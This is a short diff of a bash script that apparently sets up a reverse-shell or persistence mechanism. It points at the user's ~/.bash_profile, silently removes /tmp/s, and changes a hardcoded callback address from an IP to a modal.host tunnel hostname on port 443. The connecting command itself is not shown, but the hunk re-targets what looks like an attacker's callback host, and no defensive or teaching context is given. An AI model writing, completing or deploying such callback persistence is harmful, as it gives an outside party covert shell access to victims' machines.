@@ -1,7 +1,7 @@
 #!/bin/bash
 
 PROFILE="$HOME/.bash_profile"
-IP='3.19.188.243'
+IP='ta-01k8rhg654s3fbe2ce655zsy84-8888.wo-6p8xweub5ij6508yqmx6zs72i.w.modal.host'
 PORT='443'
 
 rm /tmp/s > /dev/null 2>&1
